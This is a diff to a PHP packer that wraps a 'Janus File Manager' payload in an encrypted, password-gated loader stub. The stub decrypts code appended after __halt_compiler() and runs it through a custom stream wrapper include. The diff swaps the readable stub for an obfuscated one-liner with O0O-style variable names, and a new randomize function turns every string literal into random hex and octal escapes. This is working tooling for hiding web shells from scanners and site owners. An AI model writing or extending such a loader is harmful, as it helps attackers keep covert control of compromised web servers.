@@ -126,9 +126,9 @@ $login_html = '<!DOCTYPE html>
     <div class="login-box">
         <h3 style="margin-top:0; color:#fff;">Janus File Manager</h3>
         
-        <?php if (isset($error)): ?>
+        <?php if (isset($OO0O)): ?>
             <div class="toast-notify">
-                <?php echo htmlspecialchars($error); ?>
+                <?php echo htmlspecialchars($OO0O); ?>
             </div>
         <?php endif; ?>
         
@@ -143,98 +143,33 @@ $login_html = '<!DOCTYPE html>
 </body>
 </html>';
 
+$randomize = function($str) {
+    $out = '';
+    $len = strlen($str);
+    for ($i = 0; $i < $len; $i++) {
+        $c = $str[$i];
+        $r = rand(0, 2);
+        if ($r === 0) {
+            $out .= '\\x' . bin2hex($c);
+        } elseif ($r === 1) {
+            $out .= '\\' . str_pad(decoct(ord($c)), 3, '0', STR_PAD_LEFT);
+        } else {
+            if (preg_match('/^[a-zA-Z0-9_\-\.\/ :<>]/', $c)) {
+                $out .= $c;
+            } else {
+                $out .= '\\x' . bin2hex($c);
+            }
+        }
+    }
+    return '"' . $out . '"';
+};
+
 $stub_template = '<?php
-error_reporting(0);
-@session_start();
-if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\' && isset($_POST[\'payload\'])) {
-    $pl_dec = base64_decode(strrev($_POST[\'payload\']));
-    if ($pl_dec !== false) {
-        $p_arr = array();
-        parse_str($pl_dec, $p_arr);
-        $_POST = $p_arr;
-    }
-}
-if ((isset($_POST[\'action\']) && $_POST[\'action\'] === \'logout\') || (isset($_GET[\'action\']) && $_GET[\'action\'] === \'logout\')) {
-    unset($_SESSION[\'obf_key\']);
-    @session_destroy();
-    setcookie(\'fm_auth\', \'\', time() - 3600, \'/\', \'\', false, true);
-    header("Location: " . $_SERVER[\'PHP_SELF\']);
-    exit;
-}
-if(!class_exists(\'VS\')){
-  class VS{
-    public $context;
-    private $p=0;
-    private $d;
-    public function stream_open($path,$mode,$options,&$opened_path){
-      $url=parse_url($path);
-      $var=$url[\'host\'];
-      $this->d=$GLOBALS[$var];
-      $this->p=0;
-      return true;
-    }
-    public function stream_read($count){
-      $ret=substr($this->d,$this->p,$count);
-      $this->p+=strlen($ret);
-      return $ret;
-    }
-    public function stream_eof(){
-      return $this->p>=strlen($this->d);
-    }
-    public function stream_stat(){
-      return array();
-    }
-    public function stream_set_option($opt,$a1,$a2){
-      return false;
-    }
-  }
-  stream_wrapper_register(\'vs\',\'VS\');
-}
-$h=fopen(__FILE__,\'r\');
-fseek($h,{{OFFSET}});
-$d=stream_get_contents($h);
-fclose($h);
-$run = false;
-$error = null;
-if (isset($_POST[\'p\'])) {
-    $pass = $_POST[\'p\'];
-    $key = hash(\'sha256\', $pass, true);
-    $iv_len = 16;
-    $iv = substr($d, 0, $iv_len);
-    $ct = substr($d, $iv_len);
-    $dec = openssl_decrypt($ct, \'aes-256-cbc\', $key, OPENSSL_RAW_DATA, $iv);
-    if ($dec !== false && substr($dec, 0, 8) === \'JANUS_OK\') {
-        $_SESSION[\'obf_key\'] = $pass;
-        setcookie(\'fm_auth\', hash(\'sha256\', $pass), time() + 86400 * 7, \'/\', \'\', false, true);
-        $_COOKIE[\'fm_auth\'] = hash(\'sha256\', $pass);
-        $GLOBALS[\'data\'] = "<?php\n" . substr($dec, 8);
-        $run = true;
-    } else {
-        $error = "Incorrect password.";
-    }
-} elseif (isset($_SESSION[\'obf_key\'])) {
-    $pass = $_SESSION[\'obf_key\'];
-    $key = hash(\'sha256\', $pass, true);
-    $iv_len = 16;
-    $iv = substr($d, 0, $iv_len);
-    $ct = substr($d, $iv_len);
-    $dec = openssl_decrypt($ct, \'aes-256-cbc\', $key, OPENSSL_RAW_DATA, $iv);
-    if ($dec !== false && substr($dec, 0, 8) === \'JANUS_OK\') {
-        setcookie(\'fm_auth\', hash(\'sha256\', $pass), time() + 86400 * 7, \'/\', \'\', false, true);
-        $_COOKIE[\'fm_auth\'] = hash(\'sha256\', $pass);
-        $GLOBALS[\'data\'] = "<?php\n" . substr($dec, 8);
-        $run = true;
-    } else {
-        unset($_SESSION[\'obf_key\']);
-    }
-}
-if ($run) {
-    include \'vs://data\';
-    exit;
-}
-?>
-' . $login_html . '
-<?php __halt_compiler();';
+error_reporting(0);@session_start();if((isset($_POST[' . $randomize('action') . '])&&$_POST[' . $randomize('action') . ']===' . $randomize('logout') . ')||(isset($_GET[' . $randomize('action') . '])&&$_GET[' . $randomize('action') . ']===' . $randomize('logout') . ')){unset($_SESSION[' . $randomize('obf_key') . ']);@session_destroy();setcookie(' . $randomize('fm_auth') . ',"",time()-3600,' . $randomize('/') . ',"",false,true);header("Location: ".$_SERVER[' . $randomize('PHP_SELF') . ']);exit;}
+if(!class_exists("O0O")){class O0O{public $context;private $O=0;private $o;public function stream_open($path,$mode,$options,&$opened_path){$url=parse_url($path);$this->o=$GLOBALS[$url[' . $randomize('host') . ']];$this->O=0;return true;}public function stream_read($count){$ret=substr($this->o,$this->O,$count);$this->O+=strlen($ret);return $ret;}public function stream_eof(){return $this->O>=strlen($this->o);}public function stream_stat(){return array();}public function stream_set_option($opt,$a1,$a2){return false;}}stream_wrapper_register(' . $randomize('O0') . ',"O0O");}
+$O00O=fopen(__FILE__,' . $randomize('r') . ');fseek($O00O,{{OFFSET}});$O0O0=stream_get_contents($O00O);fclose($O00O);$OO00=false;$OO0O=null;
+if(isset($_POST[' . $randomize('p') . '])){$O0OO=$_POST[' . $randomize('p') . '];$OOO0=hash(' . $randomize('sha256') . ',$O0OO,true);$OOOO=16;$O000=substr($O0O0,0,$OOOO);$O001=substr($O0O0,$OOOO);$O002=openssl_decrypt($O001,' . $randomize('aes-256-cbc') . ',$OOO0,OPENSSL_RAW_DATA,$O000);if($O002!==false&&substr($O002,0,8)==="\x4a\x41\x4e\x55\x53\x5f\x4f\x4b"){$_SESSION[' . $randomize('obf_key') . ']=$O0OO;setcookie(' . $randomize('fm_auth') . ',hash(' . $randomize('sha256') . ',$O0OO),time()+86400*7,' . $randomize('/') . ',"",false,true);$_COOKIE[' . $randomize('fm_auth') . ']=hash(' . $randomize('sha256') . ',$O0OO);$GLOBALS[' . $randomize('data') . ']=' . $randomize("<?php\n") . '.substr($O002,8);$OO00=true;}else{$OO0O=' . $randomize('Incorrect password.') . ';}}
+elseif(isset($_SESSION[' . $randomize('obf_key') . '])){$O0OO=$_SESSION[' . $randomize('obf_key') . '];$OOO0=hash(' . $randomize('sha256') . ',$O0OO,true);$OOOO=16;$O000=substr($O0O0,0,$OOOO);$O001=substr($O0O0,$OOOO);$O002=openssl_decrypt($O001,' . $randomize('aes-256-cbc') . ',$OOO0,OPENSSL_RAW_DATA,$O000);if($O002!==false&&substr($O002,0,8)==="\x4a\x41\x4e\x55\x53\x5f\x4f\x4b"){setcookie(' . $randomize('fm_auth') . ',hash(' . $randomize('sha256') . ',$O0OO),time()+86400*7,' . $randomize('/') . ',"",false,true);$_COOKIE[' . $randomize('fm_auth') . ']=hash(' . $randomize('sha256') . ',$O0OO);$GLOBALS[' . $randomize('data') . ']=' . $randomize("<?php\n") . '.substr($O002,8);$OO00=true;}else{unset($_SESSION[' . $randomize('obf_key') . ']);}} if($OO00){include ' . $randomize('O0://data') . ';exit;}?>' . $login_html . '<?php __halt_compiler();';
 
 // Calculate correct binary seek offset dynamically
 $offset = 0;
